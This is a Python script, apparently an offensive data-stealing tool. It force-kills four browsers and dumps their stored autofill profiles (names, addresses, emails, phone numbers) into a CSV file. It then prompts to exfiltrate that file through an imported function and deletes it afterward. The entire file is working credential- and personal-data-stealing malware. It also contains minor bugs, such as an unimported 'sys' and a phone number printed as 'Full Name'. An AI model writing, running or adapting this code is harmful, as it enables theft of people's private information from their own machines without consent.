
import sqlite3
import csv
import os
import subprocess
from pathlib import Path
from exfiltration import exfiltrate

CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Web Data"%(os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data\Default\Web Data"%(os.environ['USERPROFILE']))
OPERA_PATH = os.path.normpath(r"%s\AppData\Roaming\Opera Software\Opera Stable\Web Data"%(os.environ['USERPROFILE']))
BRAVE_PATH = os.path.normpath(r"%s\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Web Data"%(os.environ['USERPROFILE']))

info = open('personal_info.csv',mode='a',newline='',encoding='utf-8')
csv_writer = csv.writer(info,delimiter=',')
csv_writer.writerow(["Full Name","Company Name","Street Address", "City", "State", "Zipcode", "Country Code", "Email Address", "Phone Number"])
files = ["personal_info.csv"]

def cleanup(input_files):
    print("[*] Deleting files")
    for rm in input_files:
        file_exist = Path(rm)
        if file_exist.is_file():
            os.remove(rm)
            print("[*] " + rm + " Deleted")
        else:
            print("[!] " + rm + " File Not Found")

def get_info(browser,kill,web_data):
    print("############ Dumping " + browser + " Personal Info #############")
    kill = subprocess.getoutput('taskkill /F /IM ' + kill +  ' /T') #kiils all running browser processes

    try:
        conn = sqlite3.connect(web_data)
        cursor = conn.cursor()
        cursor.execute("SELECT full_name FROM autofill_profile_names;") #Select statement to retrieve info 
        for index,data in enumerate(cursor.fetchall()):
            full_name = data[0]
            print("Full Name:",full_name)

        conn = sqlite3.connect(web_data)
        cursor = conn.cursor()
        cursor.execute("SELECT company_name,street_address,city,state,zipcode,country_code from autofill_profiles;") #Select statement to retrieve info 
        for index,data in enumerate(cursor.fetchall()):
            company_name = data[0]
            street_address = data[1]
            city= data[2]
            state = data[3]
            zipcode= data[4]
            country_code = data[5]
            print("Company Name:",company_name)
            print("Street Address:",street_address)
            print("City:",city)
            print("State:",state)
            print("Zipcode:",zipcode)
            print("Country Code:",country_code)
    
            conn = sqlite3.connect(web_data)
            cursor = conn.cursor()
            cursor.execute("SELECT email FROM autofill_profile_emails;") #Select statement to retrieve info 
            for index,data in enumerate(cursor.fetchall()):
                email = data[0]
                print("Email Address:",email)
    
            conn = sqlite3.connect(web_data)
            cursor = conn.cursor()
            cursor.execute("SELECT number FROM autofill_profile_phones;") #Select statement to retrieve info 
            for index,data in enumerate(cursor.fetchall()):
                phone_number = data[0]
                print("Full Name:",phone_number)
                csv_writer.writerow([full_name,company_name,street_address,city,state,zipcode,country_code,email,phone_number])

    except sqlite3.OperationalError:
        print(browser + " Database not found")
         
    print("[+] Written data to personal_info.csv")
    
get_info("Chrome","chrome.exe",CHROME_PATH)
get_info("Edge","msedge.exe",EDGE_PATH)
get_info("Opera","opera.exe",OPERA_PATH)
get_info("Brave","brave.exe",BRAVE_PATH)
print('\n')
info.close()

exfil = input("[?] Do you want to exfiltrate data: Y/N? ")
if exfil.upper() == "N":
    print("[!] Goodbye!")
    sys.exit()

elif exfil.upper() == "Y":
    exfiltrate(files)
    cleanup(files)